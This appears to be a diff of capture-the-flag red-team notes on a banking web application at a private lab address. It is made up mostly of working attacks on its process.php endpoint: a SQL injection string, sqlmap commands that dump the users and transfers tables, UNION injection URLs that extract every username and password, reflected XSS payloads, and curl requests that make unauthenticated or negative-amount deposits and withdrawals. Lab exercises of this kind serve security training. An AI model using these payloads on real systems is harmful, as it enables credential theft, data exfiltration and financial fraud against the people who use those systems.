@@ -1,9 +1,27 @@
 Red:
     1 SQL Injection on the user parameter when requesting the balance.
         In user param: a' OR 1=1 -- 
-        With sqlmap: sqlmap -r request.txt -p "user" --dbs
-    2 Reflected XSS in the same place.
+        
+        With sqlmap: 
+        Discover dbs: sqlmap -u "http://10.1.5.2/process.php?user=aa&pass=aa&drop=balance" -p "user" --dbs
+        Discover tables: sqlmap -u "http://10.1.5.2/process.php?user=aa&pass=aa&drop=balance" -p "user" -D ctf2 --tables
+        Dump users table: sqlmap -u "http://10.1.5.2/process.php?user=aa&pass=aa&drop=balance" -p "user" -D ctf2 -T users --dump
+        Dump transfers table: sqlmap -u "http://10.1.5.2/process.php?user=aa&pass=aa&drop=balance" -p "user" -D ctf2 -T transfers --dump
+
+        Compromise user accounts with sql injection:
+        All usernames: http://10.1.5.2/process.php?user=a%27+OR+1%3D1+UNION+select+null%2C+pass%2C+user+from+users%3B+--+&pass=aa&amount=&drop=balance
+        All passwords: http://10.1.5.2/process.php?user=a%27+OR+1%3D1+UNION+select+null%2C+user%2C+pass+from+users%3B+--+&pass=aa&amount=&drop=balance
+
+    2 Reflected XSS
+        In user parameter:
+            curl "http://10.1.5.2/process.php?user=<script>alert(1)</script>&pass=temp&drop=balance"
+        In pass parameter:
+            curl "http://10.1.5.2/process.php?user=temp&pass=</script><script>alert("xss")</script><script>&drop=register"
+        
     3 No authentication when making deposits and withdrawals.
-    4 TO CHECK
-        Integer overflow in amount
-        Insert amount with negative sign
+        curl "http://10.1.5.2/process.php?user=temp&pass=temp&amount=100&drop=deposit"
+        curl "http://10.1.5.2/process.php?user=temp&pass=temp&amount=100&drop=withdraw"
+
+    4 Possible to insert amount with negative sign
+        curl "http://10.1.5.2/process.php?user=temp&pass=temp&amount=-1000&drop=deposit"
+        curl "http://10.1.5.2/process.php?user=temp&pass=temp&amount=-1000&drop=withdraw"
